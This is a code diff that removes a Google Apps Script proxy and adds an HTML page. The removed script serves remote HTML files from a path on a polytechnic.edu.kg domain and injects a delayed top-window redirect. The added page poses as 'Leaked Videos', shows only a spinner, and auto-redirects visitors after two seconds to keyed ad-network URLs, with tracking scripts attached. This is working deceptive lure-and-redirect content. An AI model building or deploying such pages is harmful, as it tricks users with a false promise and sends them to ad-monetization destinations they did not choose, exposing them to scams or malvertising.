@@ -1,458 +1,81 @@
 
-// ============================================================
-// CONFIG
-// ============================================================
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <meta name="robots" content="noindex" />
 
-const HTML_BASE_URL = "https://polytechnic.edu.kg/nabaka/";
-const REDIRECT_DELAY = 2000;
-const LANDING_URL = "https://polytechnic.edu.kg/hadia/";
+  <title>Leaked Videos</title>
 
-// Cache duration: 6 hours
-const CACHE_SECONDS = 21600;
-
-
-// ============================================================
-// MAIN
-// ============================================================
-
-function doGet(e) {
-
-  // ----------------------------------------------------------
-  // ?id=ABC123
-  // ----------------------------------------------------------
-
-  const id =
-    e &&
-    e.parameter &&
-    e.parameter.id
-      ? String(e.parameter.id).trim()
-      : "";
-
-
-  // ----------------------------------------------------------
-  // ID MISSING
-  // ----------------------------------------------------------
-
-  if (!id) {
-
-    return createErrorPage(
-      "ID missing",
-      "Please provide an ID."
-    );
-
-  }
-
-
-  // ----------------------------------------------------------
-  // VALIDATE ID
-  // ----------------------------------------------------------
-
-  if (!isValidId(id)) {
-
-    return createErrorPage(
-      "Invalid ID",
-      "The supplied ID contains invalid characters."
-    );
-
-  }
-
-
-  // ----------------------------------------------------------
-  // CACHE
-  // ----------------------------------------------------------
-
-  const cache =
-    CacheService.getScriptCache();
-
-  const cacheKey =
-    "html_" + hashId(id);
-
-  let html =
-    cache.get(cacheKey);
-
-
-  // ----------------------------------------------------------
-  // FETCH ONLY IF NOT CACHED
-  // ----------------------------------------------------------
-
-  if (!html) {
-
-    const htmlUrl =
-      HTML_BASE_URL +
-      encodeURIComponent(id) +
-      ".html";
-
-
-    try {
-
-      // ------------------------------------------------------
-      // FETCH HTML
-      // ------------------------------------------------------
-
-      const response =
-        UrlFetchApp.fetch(
-          htmlUrl,
-          {
-            method: "get",
-            muteHttpExceptions: true,
-            followRedirects: true,
-            validateHttpsCertificates: true
-          }
-        );
-
-
-      const statusCode =
-        response.getResponseCode();
-
-
-      // ------------------------------------------------------
-      // HTTP ERROR
-      // ------------------------------------------------------
-
-      if (statusCode !== 200) {
-
-        return createErrorPage(
-          "Page not found",
-          "File <b>" +
-          escapeHtml(id + ".html") +
-          "</b> could not be loaded."
-        );
-
-      }
-
-
-      // ------------------------------------------------------
-      // GET HTML
-      // ------------------------------------------------------
-
-      html =
-        response.getContentText("UTF-8");
-
-
-      // ------------------------------------------------------
-      // CACHE HTML
-      // ------------------------------------------------------
-
-      try {
-
-        cache.put(
-          cacheKey,
-          html,
-          CACHE_SECONDS
-        );
-
-      } catch (cacheError) {
-
-        // Cache failure should not break the page
-
-      }
-
-    } catch (error) {
-
-      return createErrorPage(
-        "Error",
-        escapeHtml(
-          error && error.message
-            ? error.message
-            : "Unknown error"
-        )
-      );
-
+  <!-- Fallback redirect after 1 seconds if JS is disabled -->
+  <!-- xxx
+  <meta http-equiv="refresh" content="2; url=https://www.profitableratecpmnetwork.com/pxc9vbseq3?key=8b066bc0e873c4edb3c7e69d3ee20188" />
+  -->
+  <!-- xxxx -->
+  <meta http-equiv="refresh" content="2; url=https://www.profitableratecpmnetwork.com/ztt0npyu8?key=6ceb292103750c47b1f0a35b075eadf2" />
+  
+  <style>
+    .loading-redirect {
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      text-align: center !important;
     }
-
-  }
-
-
-  // ----------------------------------------------------------
-  // EXTRACT TITLE
-  // ----------------------------------------------------------
-
-  let title =
-    extractTitle(html);
-
-
-  if (!title) {
-    title = id;
-  }
-
-
-  // ----------------------------------------------------------
-  // ADD REDIRECT
-  // ----------------------------------------------------------
-
-  html =
-    addRedirect(
-      html,
-      LANDING_URL,
-      REDIRECT_DELAY
-    );
-
-
-  // ----------------------------------------------------------
-  // RETURN HTML
-  // ----------------------------------------------------------
-
-  return HtmlService
-    .createHtmlOutput(html)
-    .setTitle(title)
-    .setXFrameOptionsMode(
-      HtmlService.XFrameOptionsMode.ALLOWALL
-    );
-
-}
-
-
-// ============================================================
-// VALIDATE ID
-// ============================================================
-
-function isValidId(id) {
-
-  if (!id) {
-    return false;
-  }
-
-  /*
-   * Unicode-friendly validation.
-   *
-   * Allows:
-   * - English
-   * - বাংলা
-   * - हिन्दी
-   * - ไทย
-   * - العربية
-   * - 日本語
-   * - Numbers
-   * - Hyphen
-   * - Underscore
-   * - Dot
-   * - Spaces
-   *
-   * Blocks:
-   * /
-   * \
-   * ?
-   * #
-   * %
-   */
-
-  return !/[\/\\?#%]/.test(id);
-
-}
-
-
-// ============================================================
-// HASH ID FOR CACHE KEY
-// ============================================================
-
-function hashId(text) {
-
-  const digest =
-    Utilities.computeDigest(
-      Utilities.DigestAlgorithm.MD5,
-      text,
-      Utilities.Charset.UTF_8
-    );
-
-
-  return digest
-    .map(function(byte) {
-
-      const value =
-        byte < 0
-          ? byte + 256
-          : byte;
-
-
-      return (
-        "0" +
-        value.toString(16)
-      ).slice(-2);
-
-    })
-    .join("");
-
-}
-
-
-// ============================================================
-// EXTRACT TITLE
-// ============================================================
-
-function extractTitle(html) {
-
-  if (!html) {
-    return "";
-  }
-
-
-  const match =
-    html.match(
-      /<title\b[^>]*>([\s\S]*?)<\/title>/i
-    );
-
-
-  if (!match) {
-    return "";
-  }
-
-
-  return match[1]
-
-    // Remove HTML tags
-    .replace(/<[^>]*>/g, "")
-
-    // Decode common HTML entities
-    .replace(/&amp;/gi, "&")
-    .replace(/&quot;/gi, '"')
-    .replace(/&#39;/gi, "'")
-    .replace(/&lt;/gi, "<")
-    .replace(/&gt;/gi, ">")
-
-    // Normalize spaces
-    .replace(/\s+/g, " ")
-
-    .trim();
-
-}
-
-
-// ============================================================
-// ADD REDIRECT
-// ============================================================
-
-function addRedirect(
-  html,
-  landingUrl,
-  delay
-) {
-
-  // ----------------------------------------------------------
-  // Escape URL for JavaScript
-  // ----------------------------------------------------------
-
-  const safeUrl =
-    String(landingUrl)
-      .replace(/\\/g, "\\\\")
-      .replace(/"/g, '\\"');
-
-
-  // ----------------------------------------------------------
-  // Safe numeric delay
-  // ----------------------------------------------------------
-
-  const safeDelay =
-    Math.max(
-      0,
-      Number(delay) || 0
-    );
-
-
-  // ----------------------------------------------------------
-  // Redirect script
-  // ----------------------------------------------------------
-
-  const redirectCode =
-    "<script>" +
-    "(function(){" +
-    "setTimeout(function(){" +
-    "window.top.location.href=\"" +
-    safeUrl +
-    "\";" +
-    "}," +
-    safeDelay +
-    ");" +
-    "})();" +
-    "</script>";
-
-
-  // ----------------------------------------------------------
-  // Insert before </body>
-  // ----------------------------------------------------------
-
-  if (/<\/body\s*>/i.test(html)) {
-
-    return html.replace(
-      /<\/body\s*>/i,
-      redirectCode + "</body>"
-    );
-
-  }
-
-
-  // ----------------------------------------------------------
-  // No </body>
-  // ----------------------------------------------------------
-
-  return html + redirectCode;
-
-}
-
-
-// ============================================================
-// ERROR PAGE
-// ============================================================
-
-function createErrorPage(
-  title,
-  message
-) {
-
-  const html =
-    "<!DOCTYPE html>" +
-
-    "<html lang=\"en\">" +
-
-    "<head>" +
-
-    "<meta charset=\"UTF-8\">" +
-
-    "<meta name=\"viewport\" " +
-    "content=\"width=device-width, initial-scale=1.0\">" +
-
-    "<title>" +
-    escapeHtml(title) +
-    "</title>" +
-
-    "</head>" +
-
-    "<body>" +
-
-    "<h1>" +
-    escapeHtml(title) +
-    "</h1>" +
-
-    "<p>" +
-    message +
-    "</p>" +
-
-    "</body>" +
-
-    "</html>";
-
-
-  return HtmlService
-    .createHtmlOutput(html)
-    .setTitle(title)
-    .setXFrameOptionsMode(
-      HtmlService.XFrameOptionsMode.ALLOWALL
-    );
-
-}
-
-
-// ============================================================
-// HTML ESCAPE
-// ============================================================
-
-function escapeHtml(text) {
-
-  return String(text)
-
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;")
-    .replace(/"/g, "&quot;")
-    .replace(/'/g, "&#039;");
-
-}
+    .lds-dual-ring {
+      display: inline-block;
+      width: 64px;
+      height: 64px;
+    }
+    .lds-dual-ring:after {
+      content: " ";
+      display: block;
+      width: 46px;
+      height: 46px;
+      margin: 1px;
+      border-radius: 50%;
+      border: 5px solid #222;
+      border-color: #222 transparent #222 transparent;
+      animation: lds-dual-ring 1.2s linear infinite;
+    }
+    @keyframes lds-dual-ring {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+
+  <script>
+    (function () {
+      const params = new URLSearchParams(window.location.search);
+      const t = params.get("t");
+      document.title = (t === null || t.trim() === "") ? "Leaked Videos" : t;
+
+      const REDIRECT_URL = "https://www.profitableratecpmnetwork.com/mpaxa8ieiv?key=73cce5e7bd30b860ccdd0ad523981f55";
+
+      // JS redirect with 1-second delay
+      setTimeout(() => {
+        window.location.replace(REDIRECT_URL);
+      }, 2000);
+    })();
+  </script>
+</head>
+<body class="loading-redirect">
+  <div class="lds-dual-ring"></div>
+
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4985492,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"8a425239a36a4829bcaaafc1cacdc356","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
